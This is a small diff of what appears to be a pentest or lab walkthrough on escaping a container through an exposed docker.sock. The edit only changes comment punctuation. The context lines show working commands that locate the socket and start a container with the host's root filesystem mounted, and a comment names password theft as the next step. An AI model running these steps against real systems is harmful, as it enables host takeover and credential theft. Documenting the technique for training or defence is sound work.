@@ -19,7 +19,7 @@ find / -name docker.sock
 # Open the docker shell
 docker exec -it sock sh
 
-# Launch a new container in the shell, via docker.sock with host root directory mounted
+# Launch a new container in the shell via docker.sock with host root directory mounted
 docker -H unix:///var/run/docker.sock run -it -v /:/test:ro -t alpine sh
 
 # Steal password with root authority
